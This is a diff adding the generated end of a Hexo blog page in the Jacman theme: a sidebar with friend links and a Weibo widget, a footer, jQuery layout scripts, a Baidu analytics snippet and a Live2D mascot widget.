+		<ul class="clearfix">
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Larry Page in Google. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="小虫">小虫</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+ </html>
